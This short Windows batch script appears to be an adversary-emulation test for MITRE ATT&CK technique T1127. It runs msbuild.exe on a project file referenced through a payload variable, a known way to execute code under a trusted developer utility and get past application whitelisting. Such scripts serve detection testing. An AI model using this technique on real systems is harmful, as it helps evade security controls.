@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Trusted Developer Utilities (T1127)
ECHO.
ECHO [+] Using 'msbuild.exe' to execute payload
ECHO -------------------------------------------------------------------
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe %PAYLOAD%T1127\src\T1127.csproj
ECHO.
